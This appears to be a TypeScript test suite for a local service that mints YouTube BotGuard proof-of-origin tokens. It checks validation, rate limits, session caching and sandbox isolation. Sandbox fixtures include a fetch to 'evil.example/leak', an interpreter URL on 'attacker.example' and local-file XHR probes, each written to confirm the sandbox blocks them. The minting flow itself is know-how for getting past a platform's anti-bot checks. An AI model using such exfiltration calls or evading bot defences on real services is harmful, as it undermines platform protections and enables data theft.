import { assert, assertEqual } from '@auqw/application/testing';
import type { FetchResponse } from './pot-service.ts';
import {
  createPotService,
  type FetchLike,
  type PotSession,
} from './pot-service.ts';

type Response = {
  readonly status: number;
  readonly body: unknown;
};

async function post(
  base: string,
  body: string,
): Promise<Response> {
  const res = await fetch(`${base}/get_pot`, {
    method: 'POST',
    headers: { 'content-type': 'application/json' },
    body,
  });
  return { status: res.status, body: await res.json() };
}

function isRecord(value: unknown): value is Record<string, unknown> {
  return typeof value === 'object' && value !== null;
}

/**
 * HTTP surface with the mint machinery stubbed through the `session`
 * seam — the BotGuard leg is covered by the live evidence run, not a
 * unit test.
 */
export async function run(): Promise<void> {
  const now = { ms: 1_000_000 };
  let builds = 0;
  const svc = createPotService({
    nowMs: () => now.ms,
    log: () => {},
    session: async (): Promise<PotSession> => {
      builds += 1;
      return {
        mint: async (binding) => `tok-${binding}`,
        expiresAtMs: now.ms + 3_600_000,
      };
    },
  });
  const port = await svc.bind();
  assert(port !== null && port > 0, 'bind returned no port');
  // Memoized: a second bind returns the same port.
  assertEqual(await svc.bind(), port, 'rebind changed the port');
  const base = svc.loopbackUrl();
  assert(base !== null && base.startsWith('http://127.0.0.1:'));
  assert(base.endsWith(`:${port}`));

  // Happy path — response carries the three fields the guest reads.
  const first = await post(base, JSON.stringify({ content_binding: 'v1' }));
  assertEqual(first.status, 200);
  assert(isRecord(first.body), 'mint response is not an object');
  assertEqual(first.body['poToken'], 'tok-v1');
  assertEqual(first.body['contentBinding'], 'v1');
  assert(
    typeof first.body['expiresAt'] === 'string' &&
      !Number.isNaN(Date.parse(first.body['expiresAt'])),
    'expiresAt is not an ISO timestamp',
  );
  // Session memoized while fresh — one build serves both mints.
  const second = await post(base, JSON.stringify({ content_binding: 'v2' }));
  assertEqual(second.status, 200);
  assert(isRecord(second.body));
  assertEqual(second.body['poToken'], 'tok-v2');
  assertEqual(builds, 1, 'fresh session rebuilt');

  // Validation.
  const empty = await post(base, JSON.stringify({ content_binding: '' }));
  assertEqual(empty.status, 400);
  const missing = await post(base, JSON.stringify({}));
  assertEqual(missing.status, 400);
  const wrongType = await post(base, JSON.stringify({ content_binding: 7 }));
  assertEqual(wrongType.status, 400);
  const oversized = await post(
    base,
    JSON.stringify({ content_binding: 'x'.repeat(600) }),
  );
  assertEqual(oversized.status, 400);
  const notJson = await post(base, 'not json');
  assertEqual(notJson.status, 400);
  const notFound = await fetch(`${base}/nope`, { method: 'POST' });
  assertEqual(notFound.status, 404);
  const wrongMethod = await fetch(`${base}/get_pot`, { method: 'GET' });
  assertEqual(wrongMethod.status, 404);
  const ping = await fetch(`${base}/ping`);
  assertEqual(ping.status, 200);

  // Oversized body → 413.
  const huge = await fetch(`${base}/get_pot`, {
    method: 'POST',
    headers: { 'content-type': 'application/json' },
    body: JSON.stringify({ content_binding: 'y'.repeat(9000) }),
  });
  assertEqual(huge.status, 413);

  // Expired session → rebuild on next mint.
  now.ms += 3_600_000;
  const third = await post(base, JSON.stringify({ content_binding: 'v3' }));
  assertEqual(third.status, 200);
  assertEqual(builds, 2, 'expired session not rebuilt');

  await svc.close();
  assertEqual(svc.port(), null, 'port leaked after close');

  // Rate limit: burst 2, no refill — third request is 429.
  const limited = createPotService({
    nowMs: () => now.ms,
    log: () => {},
    rateLimitPerSec: 0,
    rateLimitBurst: 2,
    session: async (): Promise<PotSession> => ({
      mint: async () => 'tok',
      expiresAtMs: now.ms + 60_000,
    }),
  });
  const lport = await limited.bind();
  assert(lport !== null);
  const lbase = `http://127.0.0.1:${lport}`;
  assertEqual(
    (await post(lbase, JSON.stringify({ content_binding: 'a' }))).status,
    200,
  );
  assertEqual(
    (await post(lbase, JSON.stringify({ content_binding: 'b' }))).status,
    200,
  );
  assertEqual(
    (await post(lbase, JSON.stringify({ content_binding: 'c' }))).status,
    429,
  );
  await limited.close();

  // Build failure → 503, cooldown suppresses immediate retries, the
  // window lapses → success.
  let flakyBuilds = 0;
  const flaky = createPotService({
    nowMs: () => now.ms,
    log: () => {},
    session: async (): Promise<PotSession> => {
      flakyBuilds += 1;
      if (flakyBuilds === 1) {
        throw new Error('upstream down');
      }
      return {
        mint: async () => 'tok-back',
        expiresAtMs: now.ms + 60_000,
      };
    },
  });
  const fport = await flaky.bind();
  assert(fport !== null);
  const fbase = `http://127.0.0.1:${fport}`;
  const failed = await post(fbase, JSON.stringify({ content_binding: 'x' }));
  assertEqual(failed.status, 503);
  assert(isRecord(failed.body));
  assertEqual(failed.body['error'], 'unavailable');
  const cooled = await post(fbase, JSON.stringify({ content_binding: 'x' }));
  assertEqual(cooled.status, 503);
  assertEqual(flakyBuilds, 1, 'cooldown let a retry through');
  now.ms += 16_000;
  const recovered = await post(
    fbase,
    JSON.stringify({ content_binding: 'x' }),
  );
  assertEqual(recovered.status, 200);
  assert(isRecord(recovered.body));
  assertEqual(recovered.body['poToken'], 'tok-back');
  await flaky.close();

  // A stale session is disposed the moment its reuse horizon passes,
  // BEFORE the replacement build runs — a failed refresh must not
  // keep the expired session's interpreter timers firing.
  let staleDispose = 0;
  let staleBuilds = 0;
  const stale = createPotService({
    nowMs: () => now.ms,
    log: () => {},
    session: async (): Promise<PotSession> => {
      staleBuilds += 1;
      if (staleBuilds === 1) {
        return {
          mint: async () => 'tok-old',
          expiresAtMs: now.ms + 60_000,
          dispose: () => {
            staleDispose += 1;
          },
        };
      }
      throw new Error('youtube still down');
    },
  });
  const sport = await stale.bind();
  assert(sport !== null);
  const sbase = `http://127.0.0.1:${sport}`;
  assertEqual(
    (await post(sbase, JSON.stringify({ content_binding: 'x' }))).status,
    200,
  );
  // Past the horizon; the rebuild fails — the stale session must
  // already be gone, not retained until a later success.
  now.ms += 61_000;
  assertEqual(
    (await post(sbase, JSON.stringify({ content_binding: 'x' }))).status,
    503,
  );
  assertEqual(staleDispose, 1, 'stale session leaked through failed refresh');
  await stale.close();

  // A mint-time failure drops the session — the next mint rebuilds.
  let dropBuilds = 0;
  const dropper = createPotService({
    nowMs: () => now.ms,
    log: () => {},
    session: async (): Promise<PotSession> => {
      dropBuilds += 1;
      if (dropBuilds === 1) {
        return {
          mint: async () => {
            throw new Error('po mint blew up');
          },
          expiresAtMs: now.ms + 60_000,
        };
      }
      return {
        mint: async () => 'tok-new',
        expiresAtMs: now.ms + 60_000,
      };
    },
  });
  const dport = await dropper.bind();
  assert(dport !== null);
  const dbase = `http://127.0.0.1:${dport}`;
  assertEqual(
    (await post(dbase, JSON.stringify({ content_binding: 'x' }))).status,
    503,
  );
  const rebuilt = await post(dbase, JSON.stringify({ content_binding: 'x' }));
  assertEqual(rebuilt.status, 200);
  assert(isRecord(rebuilt.body));
  assertEqual(rebuilt.body['poToken'], 'tok-new');
  assertEqual(dropBuilds, 2, 'failed session was reused');
  await dropper.close();

  // An empty mint evicts the session too — otherwise every later
  // request replays the same bad minter until its TTL ends.
  let emptyBuilds = 0;
  const emptyMint = createPotService({
    nowMs: () => now.ms,
    log: () => {},
    session: async (): Promise<PotSession> => {
      emptyBuilds += 1;
      return {
        mint: async () => (emptyBuilds === 1 ? '' : 'tok-fresh'),
        expiresAtMs: now.ms + 60_000,
      };
    },
  });
  const eport = await emptyMint.bind();
  assert(eport !== null);
  const ebase = `http://127.0.0.1:${eport}`;
  assertEqual(
    (await post(ebase, JSON.stringify({ content_binding: 'x' }))).status,
    503,
  );
  const evicted = await post(
    ebase,
    JSON.stringify({ content_binding: 'x' }),
  );
  assertEqual(evicted.status, 200);
  assert(isRecord(evicted.body));
  assertEqual(evicted.body['poToken'], 'tok-fresh');
  assertEqual(emptyBuilds, 2, 'empty-mint session was reused');
  await emptyMint.close();

  /* ------- protocol-leg fixtures (real BotGuard flow, fake wire) ------ */

  const interpreterJs = `
    globalThis.TR = {
      a: async function (program, setupCb) {
        const asyncSnapshot = function (cb, argsArr) {
          // The sandbox fetch wall: this must reject inside the vm
          // and never reach the fake wire — urls[] proves it.
          fetch('https://evil.example/leak').then(
            function () {},
            function () {},
          );
          // The sandbox fetch budget: 40 allowed-host attempts must
          // stop at the per-session cap (32) — urls[] counts the hits.
          for (var i = 0; i < 40; i++) {
            fetch('https://www.youtube.com/probe').then(
              function () {},
              function () {},
            );
          }
          // getMinter -> mintCallback (bytes->bytes) — mirrors the
          // real webPoSignalOutput contract.
          argsArr[2].push(async function () {
            return async function (binding) {
              return new Uint8Array([binding.length & 255, 42]);
            };
          });
          cb(['snap', 1]);
        };
        setupCb(
          asyncSnapshot,
          function () {},
          function () {},
          function () {},
        );
        return [asyncSnapshot];
      },
    };
  `;

  function homepageWith(interpreterUrl: string): string {
    return (
      `<!doctype html><html><script>ytcfg.set({"EVENT_ID":"ev"});` +
      `</script><script>window.ytAtN({"R":{"bgChallenge":{` +
      `"program":"1+1","globalName":"TR","interpreterUrl":{` +
      `"privateDoNotAccessOrElseTrustedResourceUrlWrappedValue":` +
      `"${interpreterUrl}"}}}});</script></html>`
    );
  }

  function fakeWire(
    interpreterUrl: string,
    generateIt: string,
    script: string = interpreterJs,
  ): {
    impl: FetchLike;
    urls: string[];
    inits: (RequestInit | undefined)[];
  } {
    const urls: string[] = [];
    const inits: (RequestInit | undefined)[] = [];
    const impl: FetchLike = async (url, init) => {
      urls.push(url);
      inits.push(init);
      // Real Response objects — the fixture exercises the same
      // getter-only .body/stream shape the production fetch returns.
      if (url === 'https://www.youtube.com') {
        return new Response(homepageWith(interpreterUrl), {
          status: 200,
        });
      }
      if (url.includes('GenerateIT')) {
        return new Response(generateIt, { status: 200 });
      }
      if (url === `https://www.google.com/js/th/fake.js`) {
        return new Response(script, { status: 200 });
      }
      if (url === 'https://www.youtube.com/json') {
        return new Response('{"a":1}', {
          status: 200,
          headers: { 'content-type': 'application/json' },
        });
      }
      if (url === 'https://www.youtube.com/blob-json') {
        return new Response('x', {
          status: 200,
          headers: { 'content-type': 'application/json' },
        });
      }
      return new Response('', { status: 404 });
    };
    return { impl, urls, inits };
  }

  // websafe fallback path — GenerateIT declines an integrity token.
  const fallbackWire = fakeWire(
    '//www.google.com/js/th/fake.js',
    '[null, 3600, 0, "RkFMTEJBQ0s"]',
  );
  const fbSvc = createPotService({
    fetchImpl: fallbackWire.impl,
    nowMs: () => now.ms,
    log: () => {},
  });
  const fbPort = await fbSvc.bind();
  assert(fbPort !== null);
  const fbRes = await post(
    `http://127.0.0.1:${fbPort}`,
    JSON.stringify({ content_binding: 'vid1' }),
  );
  assertEqual(fbRes.status, 200);
  assert(isRecord(fbRes.body));
  assertEqual(fbRes.body['poToken'], 'RkFMTEJBQ0s');
  // Wire order: homepage, interpreter, then the capped probe flood,
  // then GenerateIT once the snapshot completes.
  assertEqual(fallbackWire.urls[0], 'https://www.youtube.com');
  assertEqual(
    fallbackWire.urls[1],
    'https://www.google.com/js/th/fake.js',
  );
  const generateItHit = fallbackWire.urls.findIndex((u) =>
    u.includes('GenerateIT'),
  );
  assert(generateItHit > 1, 'GenerateIT leg never fired');
  // Redirects fail closed on the legs where they matter — the
  // allowlist covers the declared URL, not a 30x destination, and a
  // re-posted GenerateIT body would leak snapshot material.
  assertEqual(fallbackWire.inits[1]?.redirect, 'error');
  assertEqual(fallbackWire.inits[generateItHit]?.redirect, 'error');
  // The interpreter's sandboxed fetch attempt at an off-list host
  // never reached the wire.
  assert(
    !fallbackWire.urls.some((u) => u.includes('evil.example')),
    'sandboxed fetch escaped the host allowlist',
  );
  // And its 40 allowed-host probes stopped at the session budget —
  // exactly SANDBOX_FETCH_MAX_CALLS (32) reached the wire.
  assertEqual(
    fallbackWire.urls.filter((u) => u.endsWith('/probe')).length,
    32,
    'sandboxed fetch exceeded the session budget',
  );
  await fbSvc.close();

  // integrity-token path — WebPoMinter mints per binding.
  const itWire = fakeWire(
    '//www.google.com/js/th/fake.js',
    '["aXRrZW4", 3600, 0, "fb"]',
  );
  const itSvc = createPotService({
    fetchImpl: itWire.impl,
    nowMs: () => now.ms,
    log: () => {},
  });
  const itPort = await itSvc.bind();
  assert(itPort !== null);
  const itRes = await post(
    `http://127.0.0.1:${itPort}`,
    JSON.stringify({ content_binding: 'kJQP7kiw5Fk' }),
  );
  assertEqual(itRes.status, 200);
  assert(isRecord(itRes.body));
  // binding length 11 -> bytes [11, 42] -> btoa -> "Cyo="
  assertEqual(itRes.body['poToken'], 'Cyo=');
  await itSvc.close();

  // jsdom's own dispatcher answers `file:`/`data:` above the configured
  // one, and a synchronous XHR replays on a private ungated JSDOM in a
  // worker thread — the guest must not reach either. The interpreter
  // encodes the read verdict into the mint bytes, so a leak lands in
  // the token itself: 'clean' only when every probe failed.
  const sentinel = 'pot-sandbox-xhr-sentinel';
  const selfUrl = new URL(import.meta.url).href;
  const xhrProbeJs = `
    globalThis.TR = {
      a: async function (program, setupCb) {
        const asyncSnapshot = function (cb, argsArr) {
          argsArr[2].push(async function () {
            return async function (binding) {
              var verdict = 'clean';
              try {
                var sx = new XMLHttpRequest();
                sx.open('GET', ${JSON.stringify(selfUrl)}, false);
                sx.send();
                if (String(sx.responseText).indexOf('${sentinel}') !== -1) {
                  verdict = 'leak-sync';
                }
              } catch (e) {}
              try {
                await new Promise(function (resolve) {
                  var ax = new XMLHttpRequest();
                  ax.open('GET', ${JSON.stringify(selfUrl)});
                  ax.onload = function () {
                    if (
                      String(ax.responseText).indexOf('${sentinel}') !== -1
                    ) {
                      verdict = 'leak-async';
                    }
                    resolve();
                  };
                  ax.onerror = function () { resolve(); };
                  ax.send();
                });
              } catch (e) {}
              var out = [];
              for (var i = 0; i < verdict.length; i++) {
                out.push(verdict.charCodeAt(i));
              }
              return out;
            };
          });
          cb(['snap', 1]);
        };
        setupCb(
          asyncSnapshot,
          function () {},
          function () {},
          function () {},
        );
        return [asyncSnapshot];
      },
    };
  `;
  const xhrWire = fakeWire(
    '//www.google.com/js/th/fake.js',
    '["aXRrZW4", 3600, 0, "fb"]',
    xhrProbeJs,
  );
  const xhrSvc = createPotService({
    fetchImpl: xhrWire.impl,
    nowMs: () => now.ms,
    log: () => {},
  });
  const xhrPort = await xhrSvc.bind();
  assert(xhrPort !== null);
  const xhrRes = await post(
    `http://127.0.0.1:${xhrPort}`,
    JSON.stringify({ content_binding: 'bind1' }),
  );
  assertEqual(xhrRes.status, 200);
  assert(isRecord(xhrRes.body));
  assertEqual(
    xhrRes.body['poToken'],
    Buffer.from('clean').toString('base64'),
    'guest XHR escaped the sandbox gate',
  );
  await xhrSvc.close();

  // A 30-second TTL still gets a reuse window — the refresh margin
  // shrinks with the TTL instead of leaving nothing to cache, so the
  // second mint reuses the same session (no homepage refetch).
  const shortWire = fakeWire(
    '//www.google.com/js/th/fake.js',
    '[null, 30, 0, "RkFMTEJBQ0s"]',
  );
  const shortSvc = createPotService({
    fetchImpl: shortWire.impl,
    nowMs: () => now.ms,
    log: () => {},
  });
  const shortPort = await shortSvc.bind();
  assert(shortPort !== null);
  const shortBase = `http://127.0.0.1:${shortPort}`;
  assertEqual(
    (
      await post(shortBase, JSON.stringify({ content_binding: 'a' }))
    ).status,
    200,
  );
  assertEqual(
    (
      await post(shortBase, JSON.stringify({ content_binding: 'b' }))
    ).status,
    200,
  );
  assertEqual(
    shortWire.urls.filter((u) => u === 'https://www.youtube.com').length,
    1,
    'short-TTL session was rebuilt instead of reused',
  );
  await shortSvc.close();

  // A poisoned homepage pointing the interpreter off-Google fails
  // closed — the hostile leg is never fetched.
  const evilWire = fakeWire(
    '//attacker.example/x.js',
    '[null, 3600, 0, "fb"]',
  );
  const evilSvc = createPotService({
    fetchImpl: evilWire.impl,
    nowMs: () => now.ms,
    log: () => {},
  });
  const evilPort = await evilSvc.bind();
  assert(evilPort !== null);
  const evilRes = await post(
    `http://127.0.0.1:${evilPort}`,
    JSON.stringify({ content_binding: 'x' }),
  );
  assertEqual(evilRes.status, 503);
  assertEqual(
    evilWire.urls.length,
    1,
    'interpreter fetched from an unlisted host',
  );
  await evilSvc.close();

  // An oversized upstream body is rejected MID-READ — the cap must
  // bite while the body streams, not after it buffers whole in the
  // minter child's memory. This stream never ends: an unbounded
  // text() read would hang here forever.
  let pulls = 0;
  const streamBody = new ReadableStream<Uint8Array>({
    pull(controller) {
      pulls += 1;
      controller.enqueue(new Uint8Array(256 * 1_024));
    },
  });
  const bigWire: FetchLike = async () =>
    new Response(streamBody, { status: 200 }) as FetchResponse;
  const bigSvc = createPotService({
    fetchImpl: bigWire,
    nowMs: () => now.ms,
    log: () => {},
  });
  const bigPort = await bigSvc.bind();
  assert(bigPort !== null);
  const bigRes = await post(
    `http://127.0.0.1:${bigPort}`,
    JSON.stringify({ content_binding: 'x' }),
  );
  assertEqual(bigRes.status, 503);
  // 8 MiB cap at 256 KiB chunks ends ~33 pulls in — far under any
  // buffered-read horizon.
  assert(pulls < 64, `cap did not bite mid-stream (${pulls} pulls)`);
  await bigSvc.close();

  // The bounded response keeps the full Response contract — an
  // interpreter reading .json() works, and its follow-up marker
  // fetch proves the parse succeeded (only fires on resolve).
  const contractJs = `
    globalThis.TR = {
      a: async function (program, setupCb) {
        const asyncSnapshot = function (cb, argsArr) {
          fetch('https://www.youtube.com/json').then(function (r) {
            return r.json();
          }).then(function () {
            fetch('https://www.youtube.com/json-ok').then(
              function () {},
              function () {},
            );
          }, function (e) {
            fetch(
              'https://www.youtube.com/json-err-' +
                encodeURIComponent(
                  String(e && (e.stack || e.message)).slice(0, 90)
                )
            ).then(function () {}, function () {});
          });
          fetch('https://www.youtube.com/blob-json').then(function (r) {
            return r.blob();
          }).then(function (b) {
            if (b && b.type === 'application/json') {
              fetch('https://www.youtube.com/blob-ok').then(
                function () {},
                function () {},
              );
            }
          }, function () {});
          cb(['snap', 1]);
        };
        setupCb(
          asyncSnapshot,
          function () {},
          function () {},
          function () {},
        );
        return [asyncSnapshot];
      },
    };
  `;
  const contractWire = fakeWire(
    '//www.google.com/js/th/fake.js',
    '[null, 3600, 0, "RkFMTEJBQ0s"]',
    contractJs,
  );
  const contractSvc = createPotService({
    fetchImpl: contractWire.impl,
    nowMs: () => now.ms,
    log: () => {},
  });
  const contractPort = await contractSvc.bind();
  assert(contractPort !== null);
  assertEqual(
    (
      await post(
        `http://127.0.0.1:${contractPort}`,
        JSON.stringify({ content_binding: 'x' }),
      )
    ).status,
    200,
  );
  // The json() -> marker chain settles in microtasks after the mint.
  await new Promise((resolve) => setTimeout(resolve, 50));
  assert(
    contractWire.urls.some((u) => u.endsWith('/json-ok')),
    `sandboxed response lost the Response contract (json() failed): ${contractWire.urls.join(' | ')}`,
  );
  assert(
    contractWire.urls.some((u) => u.endsWith('/blob-ok')),
    'sandboxed blob() dropped the response MIME type',
  );
  await contractSvc.close();

  // Homepage without a ytAtN challenge -> typed 503.
  const bareSvc = createPotService({
    fetchImpl: async () => ({
      ok: true,
      status: 200,
      text: async () => '<html>no challenge</html>',
    }),
    nowMs: () => now.ms,
    log: () => {},
  });
  const barePort = await bareSvc.bind();
  assert(barePort !== null);
  const bareRes = await post(
    `http://127.0.0.1:${barePort}`,
    JSON.stringify({ content_binding: 'x' }),
  );
  assertEqual(bareRes.status, 503);
  await bareSvc.close();

  // Rate limiting is per-client — client A draining its own bucket
  // cannot starve client B.
  const keyed = createPotService({
    nowMs: () => now.ms,
    log: () => {},
    rateLimitPerSec: 0,
    rateLimitBurst: 2,
    clientKey: (req) => {
      const header = req.headers['x-test-client'];
      return typeof header === 'string' ? header : 'anon';
    },
    session: async (): Promise<PotSession> => ({
      mint: async () => 'tok',
      expiresAtMs: now.ms + 60_000,
    }),
  });
  const kport = await keyed.bind();
  assert(kport !== null);
  const kbase = `http://127.0.0.1:${kport}`;
  const postAs = async (client: string): Promise<Response> => {
    const res = await fetch(`${kbase}/get_pot`, {
      method: 'POST',
      headers: {
        'content-type': 'application/json',
        'x-test-client': client,
      },
      body: JSON.stringify({ content_binding: 'v' }),
    });
    return { status: res.status, body: await res.json() };
  };
  assertEqual((await postAs('A')).status, 200);
  assertEqual((await postAs('A')).status, 200);
  assertEqual((await postAs('A')).status, 429);
  assertEqual(
    (await postAs('B')).status,
    200,
    'one client starved another',
  );
  await keyed.close();

  // close() racing a still-pending bind resolves null and leaves no
  // resurrected listener behind.
  const racer = createPotService({
    nowMs: () => now.ms,
    log: () => {},
    session: async (): Promise<PotSession> => ({
      mint: async () => 'tok',
      expiresAtMs: now.ms + 60_000,
    }),
  });
  const racingBind = racer.bind();
  await racer.close();
  assertEqual(
    await racingBind,
    null,
    'close during bind resurrected a listener',
  );
  assertEqual(racer.port(), null);

  // close() racing a still-pending session build disposes the fresh
  // session rather than installing timers the close already missed.
  let disposeCalls = 0;
  let releaseBuild: ((session: PotSession) => void) | undefined;
  const buildGate = new Promise<PotSession>((resolve) => {
    releaseBuild = resolve;
  });
  const racer2 = createPotService({
    nowMs: () => now.ms,
    log: () => {},
    session: () => buildGate,
  });
  const port2 = await racer2.bind();
  assert(port2 !== null, 'second racer bind returned no port');
  const pendingPost = post(
    `http://127.0.0.1:${port2}`,
    JSON.stringify({ content_binding: 'x' }),
  );
  await new Promise((resolve) => setTimeout(resolve, 10));
  const closingNow = racer2.close();
  releaseBuild?.({
    mint: async () => 'tok',
    expiresAtMs: now.ms + 60_000,
    dispose: () => {
      disposeCalls += 1;
    },
  });
  const lateResp = await pendingPost.catch(() => null);
  await closingNow;
  // The socket may die on closeAllConnections before the 503 writes —
  // either way no token was minted.
  assert(
    lateResp === null || lateResp.status >= 400,
    'close-during-build mint succeeded',
  );
  assertEqual(disposeCalls, 1, 'close-during-build leaked a session');
}
